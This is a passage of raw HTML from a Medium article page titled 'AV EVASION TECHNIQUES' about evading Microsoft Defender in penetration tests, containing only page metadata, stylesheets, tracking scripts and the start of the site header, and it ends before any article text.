<html lang="en" data-rh="lang"><head><title>AV EVASION TECHNIQUES. How to fool the Microsoft Defender and… | by Karol Mazurek | Medium</title><meta data-rh="true" charset="utf-8"><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"><meta data-rh="true" name="theme-color" content="#000000"><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"><meta data-rh="true" property="al:ios:app_name" content="Medium"><meta data-rh="true" property="al:ios:app_store_id" content="828256236"><meta data-rh="true" property="al:android:package" content="com.medium.reader"><meta data-rh="true" property="fb:app_id" content="542599432471018"><meta data-rh="true" property="og:site_name" content="Medium"><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2022-05-17T16:22:09.781Z"><meta data-rh="true" name="title" content="AV EVASION TECHNIQUES. How to fool the Microsoft Defender and… | by Karol Mazurek | Medium"><meta data-rh="true" property="og:title" content="AV EVASION TECHNIQUES"><meta data-rh="true" property="al:android:url" content="medium://p/aa0742d806db"><meta data-rh="true" property="al:ios:url" content="medium://p/aa0742d806db"><meta data-rh="true" property="al:android:app_name" content="Medium"><meta data-rh="true" name="description" content="During the Penetration Testing, if you come across a Windows OS, in most cases it will be protected at least by the basic anti-virus system called &quot;Microsoft Defender&quot;. In this article, you will…"><meta data-rh="true" property="og:description" content="How to fool the Microsoft Defender and other anti-virus systems."><meta data-rh="true" property="og:url" content="https://karol-mazurek.medium.com/av-evasion-techniques-aa0742d806db"><meta data-rh="true" property="al:web:url" content="https://karol-mazurek.medium.com/av-evasion-techniques-aa0742d806db"><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"><meta data-rh="true" property="article:author" content="https://karol-mazurek.medium.com"><meta data-rh="true" name="author" content="Karol Mazurek"><meta data-rh="true" name="robots" content="index,follow,max-image-preview:large"><meta data-rh="true" name="referrer" content="unsafe-url"><meta data-rh="true" property="twitter:title" content="AV EVASION TECHNIQUES"><meta data-rh="true" name="twitter:site" content="@Medium"><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/aa0742d806db"><meta data-rh="true" property="twitter:description" content="How to fool the Microsoft Defender and other anti-virus systems."><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" name="twitter:label1" content="Reading time"><meta data-rh="true" name="twitter:data1" content="11 min read"><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/1*m-R_BkNf1Qjr1YbyOIJY2w.png"><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:152:152/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:120:120/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:76:76/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:60:60/1*sHhtYhaCe2Uc3IU0IgKwIQ.png"><link data-rh="true" rel="mask-icon" href="https://cdn-static-1.medium.com/_/fp/icons/Medium-Avatar-500x500.svg" color="#171717"><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossorigin=""><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"><link data-rh="true" rel="author" href="https://karol-mazurek.medium.com"><link data-rh="true" rel="canonical" href="https://karol-mazurek.medium.com/av-evasion-techniques-aa0742d806db"><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/aa0742d806db"><style type="text/css" data-fela-rehydration="471" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="471" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-webkit-keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}@-moz-keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}@keyframes k1{0%{transform:translate(-50%, -100px)}100%{transform:translate(-50%, 0)}}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{margin-left:16px}.av{border:none}.aw{border-radius:20px}.ax{width:240px}.ay{background:#F9F9F9}.az path{fill:#6B6B6B}.bb{outline:none}.bc{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bd{font-size:14px}.be{width:100%}.bf{padding:10px 20px 10px 0}.bg{background-color:transparent}.bh{color:#242424}.bi::placeholder{color:#6B6B6B}.bj{display:inline-block}.bk{margin-left:12px}.bl{margin-right:12px}.bm{border-radius:4px}.bn{margin-left:24px}.bo{height:24px}.bu{background-color:#F9F9F9}.bv{border-radius:50%}.bw{height:32px}.bx{width:32px}.by{justify-content:center}.ce{max-width:680px}.cf{min-width:0}.cg{animation:k1 1.2s ease-in-out infinite}.ch{height:100vh}.ci{margin-bottom:16px}.cj{margin-top:48px}.ck{align-items:flex-start}.cl{flex-direction:column}.cm{justify-content:space-between}.cn{margin-bottom:24px}.ct{width:80%}.cu{background-color:#F2F2F2}.da{height:44px}.db{width:44px}.dc{margin:auto 0}.dd{margin-bottom:4px}.de{height:16px}.df{width:120px}.dg{width:80px}.dm{margin-bottom:8px}.dn{width:96%}.do{width:98%}.dp{width:81%}.dq{margin-left:8px}.dr{color:#6B6B6B}.ds{font-size:13px}.dt{height:100%}.el{color:#FFFFFF}.em{fill:#FFFFFF}.eo{background:#1A8917}.ep{border-color:#1A8917}.et:disabled{cursor:inherit !important}.eu:disabled{opacity:0.3}.ev:disabled:hover{background:#1A8917}.ew:disabled:hover{border-color:#1A8917}.ex{border-radius:99em}.ey{border-width:1px}.ez{border-style:solid}.fa{box-sizing:border-box}.fb{text-decoration:none}.fc{text-align:center}.ff{margin-right:32px}.fg{position:relative}.fh{fill:#6B6B6B}.fk{background:transparent}.fl svg{margin-left:4px}.fm svg{fill:#6B6B6B}.fo{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fp{position:absolute}.fr{display:none}.fx{margin:0 24px}.gb{background:rgba(255, 255, 255, 1)}.gc{border:1px solid #F2F2F2}.gd{box-shadow:0 1px 4px #F2F2F2}.ge{max-height:100vh}.gf{overflow-y:auto}.gg{left:0}.gh{top:calc(100vh + 100px)}.gi{bottom:calc(100vh + 100px)}.gj{width:10px}.gk{pointer-events:none}.gq{margin-right:4px}.gr{margin-top:2px}.gs{box-sizing:content-box}.gt{word-break:break-word}.gu{word-wrap:break-word}.gv:after{display:block}.gw:after{content:""}.gx:after{clear:both}.gy{line-height:1.23}.gz{letter-spacing:0}.ha{font-style:normal}.hb{font-weight:700}.hw{margin-top:0px}.hx{@media all and (max-width: 551.98px):8px}.hy{@media all and (min-width: 552px) and (max-width: 727.98px):8px}.hz{@media all and (min-width: 728px) and (max-width: 903.98px):16px}.ia{@media all and (min-width: 904px) and (max-width: 1079.98px):16px}.ib{@media all and (min-width: 1080px):16px}.ih{align-items:baseline}.ii{width:48px}.ij{height:48px}.ik{border:2px solid rgba(255, 255, 255, 1)}.il{z-index:0}.im{box-shadow:none}.in{border:1px solid rgba(0, 0, 0, 0.05)}.io{margin-bottom:2px}.ip{flex-wrap:nowrap}.iq{font-size:16px}.ir{line-height:24px}.it{margin:0 8px}.iu{display:inline}.iv{color:#1A8917}.iw{fill:#1A8917}.iz{flex:0 0 auto}.jc{flex-wrap:wrap}.jd{padding-left:8px}.je{padding-right:8px}.kf> *{flex-shrink:0}.kg{overflow-x:scroll}.kh::-webkit-scrollbar{display:none}.ki{scrollbar-width:none}.kj{-ms-overflow-style:none}.kk{width:74px}.kl{flex-direction:row}.km{z-index:2}.kp{-webkit-user-select:none}.kq{border:0}.kr{fill:rgba(117, 117, 117, 1)}.ku{outline:0}.kv{user-select:none}.kw> svg{pointer-events:none}.lf{cursor:progress}.lg{margin-left:4px}.lh{opacity:1}.li{padding:4px 0}.ll{width:16px}.ln{display:inline-flex}.lt{max-width:100%}.lu{padding:8px 2px}.lv svg{color:#6B6B6B}.mm{line-height:1.58}.mn{letter-spacing:-0.004em}.mo{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nj{margin-bottom:-0.46em}.nk{margin-left:auto}.nl{margin-right:auto}.nm{max-width:1920px}.ns{clear:both}.nu{cursor:zoom-in}.nv{z-index:auto}.nx{height:auto}.ny{line-height:1.12}.nz{letter-spacing:-0.022em}.oa{font-weight:600}.ov{margin-bottom:-0.28em}.pb{border-top:none}.ph{height:52px}.pi{max-height:52px}.pj{position:static}.pk{z-index:1}.pm{max-width:155px}.ps{margin-right:20px}.py{align-items:flex-end}.pz{width:76px}.qa{height:76px}.qb{border:2px solid #F9F9F9}.qc{height:72px}.qd{width:72px}.qe{padding:8px 16px}.qf{width:auto}.qg{stroke:#F2F2F2}.qh{height:36px}.qi{width:36px}.qj{color:#F2F2F2}.qk{fill:#F2F2F2}.ql{background:#F2F2F2}.qm{border-color:#F2F2F2}.qs{font-weight:500}.qt{font-size:24px}.qu{line-height:30px}.qv{letter-spacing:-0.016em}.qw{margin-top:8px}.qx{margin-top:16px}.qy{height:0px}.qz{border-bottom:solid 1px #E5E5E5}.ra{margin-top:72px}.rb{padding:24px 0}.rc{margin-bottom:0px}.rd{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.eq:hover{background:#156D12}.er:hover{border-color:#156D12}.es:hover{cursor:pointer}.fi:hover{color:#242424}.fj:hover{fill:#242424}.fn:hover svg{fill:#242424}.fq:hover{background-color:rgba(0, 0, 0, 0.1)}.is:hover{text-decoration:underline}.ix:hover:not(:disabled){color:#156D12}.iy:hover:not(:disabled){fill:#156D12}.kt:hover{fill:rgba(8, 8, 8, 1)}.lj:hover{fill:#000000}.lk:hover p{color:#000000}.lm:hover{color:#000000}.lw:hover svg{color:#000000}.qn:hover{background:#F2F2F2}.qo:hover{border-color:#F2F2F2}.qp:hover{cursor:wait}.qq:hover{color:#F2F2F2}.qr:hover{fill:#F2F2F2}.ba:focus-within path{fill:#242424}.ks:focus{fill:rgba(8, 8, 8, 1)}.lx:focus svg{color:#000000}.nw:focus{transform:scale(1.01)}.kx:active{border-style:none}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bt{width:64px}.cd{margin:0 64px}.cs{height:48px}.cz{margin-bottom:52px}.dl{margin-bottom:48px}.ec{font-size:14px}.ed{line-height:20px}.ej{font-size:13px}.ek{padding:5px 12px}.fe{display:flex}.fw{margin-bottom:68px}.ga{max-width:680px}.gp{margin-top:40px}.hs{font-size:42px}.ht{margin-bottom:32px}.hu{line-height:52px}.hv{letter-spacing:-0.011em}.ig{align-items:center}.jr{border-top:solid 1px #F2F2F2}.js{border-bottom:solid 1px #F2F2F2}.jt{margin:32px 0 0}.ju{padding:3px 8px}.kd> *{margin-right:24px}.ke> :last-child{margin-right:0}.le{margin-top:0px}.ls{margin:0}.nf{font-size:20px}.ng{margin-top:2.14em}.nh{line-height:32px}.ni{letter-spacing:-0.003em}.nr{margin-top:56px}.or{font-size:24px}.os{margin-top:1.95em}.ot{line-height:30px}.ou{letter-spacing:-0.016em}.pa{margin-top:0.94em}.pg{margin-bottom:88px}.pr{display:inline-block}.px{padding-top:72px}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.ld{margin-top:0px}.pq{display:inline-block}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.lc{margin-top:0px}.pp{display:inline-block}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.la{margin-top:0px}.lb{margin-right:0px}.po{display:inline-block}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bp{width:24px}.bz{margin:0 24px}.co{height:40px}.cv{margin-bottom:44px}.dh{margin-bottom:32px}.du{font-size:13px}.dv{line-height:20px}.ee{padding:0px 8px 1px}.fs{margin-bottom:4px}.gl{margin-top:32px}.hc{font-size:32px}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.ic{align-items:flex-start}.ja{flex-direction:column}.jf{margin:24px -24px 0}.jg{padding:0}.jv> *{margin-right:8px}.jw> :last-child{margin-right:24px}.kn{margin-left:0px}.ky{margin-top:0px}.kz{margin-right:0px}.lo{margin:0}.ly{border:1px solid #F2F2F2}.lz{border-radius:99em}.ma{padding:0px 16px 0px 12px}.mb{height:38px}.mc{align-items:center}.me svg{margin-right:8px}.mp{font-size:18px}.mq{margin-top:1.56em}.mr{line-height:28px}.ms{letter-spacing:-0.003em}.nn{margin-top:40px}.ob{font-size:20px}.oc{margin-top:1.2em}.od{line-height:24px}.oe{letter-spacing:0}.ow{margin-top:0.67em}.pc{margin-bottom:80px}.pn{display:inline-block}.pt{padding-top:48px}.md:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bs{width:64px}.cc{margin:0 64px}.cr{height:48px}.cy{margin-bottom:52px}.dk{margin-bottom:48px}.ea{font-size:14px}.eb{line-height:20px}.eh{font-size:13px}.ei{padding:5px 12px}.fd{display:flex}.fv{margin-bottom:68px}.fz{max-width:680px}.go{margin-top:40px}.ho{font-size:42px}.hp{margin-bottom:32px}.hq{line-height:52px}.hr{letter-spacing:-0.011em}.if{align-items:center}.jn{border-top:solid 1px #F2F2F2}.jo{border-bottom:solid 1px #F2F2F2}.jp{margin:32px 0 0}.jq{padding:3px 8px}.kb> *{margin-right:24px}.kc> :last-child{margin-right:0}.lr{margin:0}.nb{font-size:20px}.nc{margin-top:2.14em}.nd{line-height:32px}.ne{letter-spacing:-0.003em}.nq{margin-top:56px}.on{font-size:24px}.oo{margin-top:1.95em}.op{line-height:30px}.oq{letter-spacing:-0.016em}.oz{margin-top:0.94em}.pf{margin-bottom:88px}.pw{padding-top:72px}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.br{width:64px}.cb{margin:0 48px}.cq{height:48px}.cx{margin-bottom:52px}.dj{margin-bottom:48px}.dy{font-size:13px}.dz{line-height:20px}.eg{padding:0px 8px 1px}.fu{margin-bottom:68px}.fy{max-width:680px}.gn{margin-top:40px}.hk{font-size:42px}.hl{margin-bottom:32px}.hm{line-height:52px}.hn{letter-spacing:-0.011em}.ie{align-items:center}.jj{border-top:solid 1px #F2F2F2}.jk{border-bottom:solid 1px #F2F2F2}.jl{margin:32px 0 0}.jm{padding:3px 8px}.jz> *{margin-right:24px}.ka> :last-child{margin-right:0}.lq{margin:0}.mx{font-size:20px}.my{margin-top:2.14em}.mz{line-height:32px}.na{letter-spacing:-0.003em}.np{margin-top:56px}.oj{font-size:24px}.ok{margin-top:1.95em}.ol{line-height:30px}.om{letter-spacing:-0.016em}.oy{margin-top:0.94em}.pe{margin-bottom:88px}.pv{padding-top:72px}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bq{width:24px}.ca{margin:0 24px}.cp{height:40px}.cw{margin-bottom:44px}.di{margin-bottom:32px}.dw{font-size:13px}.dx{line-height:20px}.ef{padding:0px 8px 1px}.ft{margin-bottom:4px}.gm{margin-top:32px}.hg{font-size:32px}.hh{margin-bottom:24px}.hi{line-height:38px}.hj{letter-spacing:-0.014em}.id{align-items:flex-start}.jb{flex-direction:column}.jh{margin:24px 0 0}.ji{padding:0}.jx> *{margin-right:8px}.jy> :last-child{margin-right:8px}.ko{margin-left:0px}.lp{margin:0}.mf{border:1px solid #F2F2F2}.mg{border-radius:99em}.mh{padding:0px 16px 0px 12px}.mi{height:38px}.mj{align-items:center}.ml svg{margin-right:8px}.mt{font-size:18px}.mu{margin-top:1.56em}.mv{line-height:28px}.mw{letter-spacing:-0.003em}.no{margin-top:40px}.of{font-size:20px}.og{margin-top:1.2em}.oh{line-height:24px}.oi{letter-spacing:0}.ox{margin-top:0.67em}.pd{margin-bottom:80px}.pu{padding-top:48px}.mk:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="print">.pl{display:none}</style><style type="text/css" data-fela-rehydration="471" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.nt{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__pl.js" crossorigin="anonymous" integrity="sha384-EtuwsrUt4o3rjKbOIgbMlrdETicyC7YJiOMF4S2kRPR2c6EcUDPrB1OFkiSEO3IC"></script><script async="" src="https://cdn.branch.io/branch-latest.min.js"></script><script type="application/ld+json" data-rh="true">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*tI1sdO2GNSEBjEs9ZNL91w.jpeg"],"url":"https:\u002F\u002Fkarol-mazurek.medium.com\u002Fav-evasion-techniques-aa0742d806db","dateCreated":"2022-03-18T16:30:32.961Z","datePublished":"2022-03-18T16:30:32.961Z","dateModified":"2023-07-24T17:23:02.656Z","headline":"AV EVASION TECHNIQUES - Karol Mazurek - Medium","name":"AV EVASION TECHNIQUES - Karol Mazurek - Medium","description":"During the Penetration Testing, if you come across a Windows OS, in most cases it will be protected at least by the basic anti-virus system called \"Microsoft Defender\". In this article, you will…","identifier":"aa0742d806db","author":{"@type":"Person","name":"Karol Mazurek","url":"https:\u002F\u002Fkarol-mazurek.medium.com"},"creator":["Karol Mazurek"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fkarol-mazurek.medium.com\u002F","logo":{"@type":"ImageObject","width":308,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:385\u002F1*OMF3fSqH8t4xBJ9-6oZDZw.png"}},"mainEntityOfPage":"https:\u002F\u002Fkarol-mazurek.medium.com\u002Fav-evasion-techniques-aa0742d806db","isAccessibleForFree":"False","hasPart":{"@type":"WebPageElement","isAccessibleForFree":"False","cssSelector":".meteredContent"}}</script><script async="true" src="https://www.googletagmanager.com/gtag/js?id=G-7JY7T788PK" data-rh="true"></script><script data-rh="true">window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());

            gtag('config', 'G-7JY7T788PK');</script><script type="text/javascript" data-rh="true">(function(b,r,a,n,c,h,_,s,d,k){if(!b[n]||!b[n]._q){for(;s<_.length;)c(h,_[s++]);d=r.createElement(a);d.async=1;d.src="https://cdn.branch.io/branch-latest.min.js";k=r.getElementsByTagName(a)[0];k.parentNode.insertBefore(d,k);b[n]=h}})(window,document,"script","branch",function(b,r){b[r]=function(){b._q.push([r,arguments])}},{_q:[],_v:1},"addListener applyCode autoAppIndex banner closeBanner closeJourney creditHistory credits data deepview deepviewCta first getCode init link logout redeem referrals removeListener sendSMS setBranchViewData setIdentity track validateCode trackCommerceEvent logEvent".split(" "), 0);
branch.init('key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm', {metadata: {}, 'no_journeys': true, 'disable_exit_animation': true, 'disable_entry_animation': true, 'tracking_disabled': null}, function(err, data) {});</script><script src="https://www.google.com/recaptcha/enterprise.js?render=6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp" data-rh="true"></script></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div><script>if (window.self !== window.top) window.location = "about:blank"</script></div><div class="l c"><div class="l m n o c" style="transform: translateY(0px);"><div class="p q r s t u v w x i d y z"><a class="dr ag ds bc ak b am an ao ap aq ar as at s u w i d q dt z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Faa0742d806db&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---two_column_layout_nav----------------------------------" rel="noopener follow">Open in app<svg width="10" height="10" viewBox="0 0 10 10" fill="none" class="dq"><path d="M.98 8.48a.37.37 0 1 0 .54.54l-.54-.54zm7.77-7.23h.38c0-.2-.17-.38-.38-.38v.38zM8.37 6.5a.37.37 0 1 0 .76 0h-.76zM3.5.87a.37.37 0 1 0 0 .76V.88zM1.52 9.03l7.5-7.5-.54-.54-7.5 7.5.54.54zm6.86-7.77V6.5h.74V1.25h-.74zm-4.88.38h5.25V.88H3.5v.74z" fill="currentColor"></path></svg></a><div class="ab q"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><button class="bc b du dv ee dw dx ef dy dz eg eh eb ei ej ed ek el em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" data-testid="headerSignUpButton">Sign up</button></span></p><div class="au l"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fkarol-mazurek.medium.com%2Fav-evasion-techniques-aa0742d806db&amp;source=post_page---two_column_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---two_column_layout_nav----------------------------------" rel="noopener follow"><svg width="120" height="27" viewBox="0 0 120 27" fill="none"><mask id="logo-wordmark-pride_svg__a" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="1" y="0" width="119" height="27"><path d="M29.69 2.36h.03v-.29h-7.26L15.7 18.05 8.96 2.07H1.12v.28l.04.01c1.32.3 2 .75 2 2.37v19c0 1.62-.68 2.07-2 2.37h-.04v.29h5.31v-.28H6.4c-1.33-.3-2-.76-2-2.38V5.83l8.67 20.56h.5l8.91-21.13V24.2c-.1 1.28-.78 1.67-1.98 1.95h-.03v.28h9.25v-.27l-.03-.01c-1.2-.28-1.89-.67-2-1.95V4.73c0-1.62.67-2.07 2-2.37zm4.23 12.58c.15-3.41 1.37-5.87 3.4-5.92.64.01 1.17.22 1.58.62.87.86 1.28 2.64 1.22 5.3h-6.2zm-.1.96h10.86v-.04c-.03-2.61-.78-4.64-2.23-6.03a7.3 7.3 0 0 0-5.05-1.87h-.04a7.31 7.31 0 0 0-5.75 2.78 10.4 10.4 0 0 0-2.08 5.72l-.02.2a7.61 7.61 0 0 0-.02.56v.58c.11 5.09 2.84 9.16 7.69 9.16 4.25 0 6.73-3.14 7.35-7.34l-.32-.11c-1.08 2.26-3.03 3.63-5.25 3.46-3.03-.23-5.35-3.32-5.13-7.06m23.12 6.89c-.36.85-1.1 1.32-2.1 1.32s-1.9-.7-2.55-1.94a12.23 12.23 0 0 1-1.06-5.49c0-4.68 1.45-7.7 3.68-7.7.94 0 1.68.47 2.03 1.28V22.8zm7.2 3.33c-1.33-.31-2-.78-2-2.49V.96l-8.07 2.39v.3l.05-.01c1.11-.1 1.87.06 2.3.47.35.32.52.8.52 1.5v3.1a5.18 5.18 0 0 0-2.89-.75c-2.33 0-4.45.98-5.99 2.78-1.6 1.86-2.44 4.42-2.44 7.38 0 5.28 2.58 8.84 6.43 8.84a5.09 5.09 0 0 0 4.89-3.34v2.81h7.23v-.29h-.03zm6.9-22.09c0-1.65-1.23-2.9-2.87-2.9a2.87 2.87 0 0 0-2.9 2.9c0 1.63 1.27 2.9 2.9 2.9a2.82 2.82 0 0 0 2.88-2.9zm1.91 22.1c-1.32-.32-2-.8-2-2.5V8.01l-7.24 2.1v.28h.05c1.56.14 1.99.68 1.99 2.53v13.51H73v-.29h-.04zm18.54 0c-1.33-.32-2-.8-2-2.5V8.01l-6.89 2.02v.29h.04c1.28.14 1.65.71 1.65 2.56v9.88a2.48 2.48 0 0 1-2.2 1.4c-1.57 0-2.43-1.08-2.43-3.02V8.01l-7.24 2.1v.28h.04c1.57.14 2 .68 2 2.53v8.36c0 .58.05 1.16.15 1.74l.13.57c.61 2.21 2.22 3.37 4.73 3.37 2.13 0 4-1.33 4.82-3.4v2.88h7.23v-.3h-.03zm28.1.3v-.3h-.03c-1.44-.34-2-.97-2-2.26V13.25c0-3.31-1.85-5.3-4.95-5.3a5.08 5.08 0 0 0-4.9 3.37c-.58-2.17-2.25-3.36-4.73-3.36a4.7 4.7 0 0 0-4.61 3.1V8.02l-7.23 2v.3h.04c1.55.14 2 .7 2 2.49v13.63h6.74v-.29h-.03c-1.15-.28-1.52-.78-1.52-2.05V11.9c.3-.71.91-1.56 2.13-1.56 1.5 0 2.26 1.05 2.26 3.12v12.97h6.75v-.29h-.03c-1.15-.28-1.52-.78-1.52-2.05V13.25a7 7 0 0 0-.1-1.21c.32-.78.97-1.7 2.23-1.7 1.53 0 2.27 1.02 2.27 3.12v12.97h7.23z" fill="#242424"></path></mask><g filter="url(#logo-wordmark-pride_svg__filter0_f_238_6555)" mask="url(#logo-wordmark-pride_svg__a)"><path d="M42.3-64.7l-15.52-6.74L-24.62 47l15.53 6.74L42.3-64.7z" fill="#000"></path><path d="M53.18-59.98L42.3-64.7-9.1 53.74l10.88 4.72 51.4-118.44z" fill="#603917"></path><path d="M64.96-54.87l-11.78-5.11L1.78 58.46l11.79 5.11 51.4-118.44z" fill="#71E2FD"></path><path d="M75.84-50.15l-10.88-4.72-51.4 118.44 10.89 4.72L75.84-50.15z" fill="#FF9BC9"></path><path d="M86.71-45.43l-10.87-4.72L24.44 68.3l10.88 4.72 51.4-118.44z" fill="#FF472F"></path><path d="M97.6-40.7L86.7-45.44 35.32 73.01l10.88 4.72L97.6-40.7z" fill="#FF8312"></path><path d="M108.47-35.99L97.6-40.7 46.2 77.73l10.88 4.72 51.4-118.44z" fill="#FFCE00"></path><path 